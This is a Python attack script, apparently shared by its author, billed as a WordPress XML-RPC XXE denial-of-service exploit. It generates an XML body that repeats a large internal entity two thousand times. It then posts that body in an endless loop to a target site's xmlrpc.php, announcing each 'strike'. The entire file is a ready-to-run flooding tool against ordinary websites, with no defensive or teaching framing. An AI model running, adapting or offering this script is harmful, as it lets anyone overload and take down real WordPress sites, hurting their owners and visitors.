import string
import random
import requests
import optparse
import os

#Made By TheGreenGremlin 2021/03/06
def ShowBanner():
	print("""
Made By
 ______  __ __    ___   ____  ____     ___    ___  ____    ____  ____     ___  ___ ___  _      ____  ____  
|      T|  T  T  /  _] /    T|    \   /  _]  /  _]|    \  /    T|    \   /  _]|   T   T| T    l    j|    \ 
|      ||  l  | /  [_ Y   __j|  D  ) /  [_  /  [_ |  _  YY   __j|  D  ) /  [_ | _   _ || |     |  T |  _  Y
l_j  l_j|  _  |Y    _]|  T  ||    / Y    _]Y    _]|  |  ||  T  ||    / Y    _]|  \_/  || l___  |  | |  |  |
  |  |  |  |  ||   [_ |  l_ ||    \ |   [_ |   [_ |  |  ||  l_ ||    \ |   [_ |   |   ||     T |  | |  |  |
  |  |  |  |  ||     T|     ||  .  Y|     T|     T|  |  ||     ||  .  Y|     T|   |   ||     | j  l |  |  |
  l__j  l__j__jl_____jl___,_jl__j\_jl_____jl_____jl__j__jl___,_jl__j\_jl_____jl___j___jl_____j|____jl__j__j

							[Wordpress XMLRPC XXE DDoS Exploit]

""")
	os.system("sleep 2.5")
	os.system("clear")

def generateXXE():
	letters = string.ascii_lowercase
	XMLprolog = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?><!DOCTYPE "
	randomRoot = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(5))
	XMLandRoot = XMLprolog + randomRoot
	ENTITY = "[<!ENTITY "
	EntityName = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(3))
	RandomFiller = '"' + ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(1500)) + '">]><methodCall><methodName>'
	XMLandRootENTITYAndFiller = XMLandRoot + " " + ENTITY + EntityName + " " + RandomFiller
	Callee = ("&" + EntityName + ";") * 2000
	XMLAlmostFinal = XMLandRootENTITYAndFiller + Callee
	randomValueOne = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(6))
	randomValueTwo = ''.join(random.choice(string.ascii_uppercase + string.ascii_uppercase) for i in range(7))
	ClosingMarkdowns = "</methodName><params><param><value>" + randomValueOne + "</value></param><param><value>" + randomValueTwo + "</value></param></params></methodCall>"
	finalExploit = XMLAlmostFinal + ClosingMarkdowns
	return finalExploit

def parseArguments():
	parser = optparse.OptionParser()
	parser.add_option("-u", "--url", dest="url", help="Target URL ending with xmlrpc.php")
	(options, arguments) = parser.parse_args()
	if not options.url:
		parser.error("Please enter the URL of the target website")
	else:
		return options.url

def sendRequest(url, payload):
	x = requests.post(url, data=payload, proxies={"http":"http://127.0.0.1:8080"})

def main():
	ShowBanner()
	i = 1
	while True:
		try:
			URL = parseArguments()
			exploit = generateXXE()
			print("[+]======> Striking target with {0} payload".format(i))
			sendRequest(URL, exploit)
			i+=1
		except KeyboardInterrupt:
			print("[-] Goodbye friend !")
			exit(1)
main()
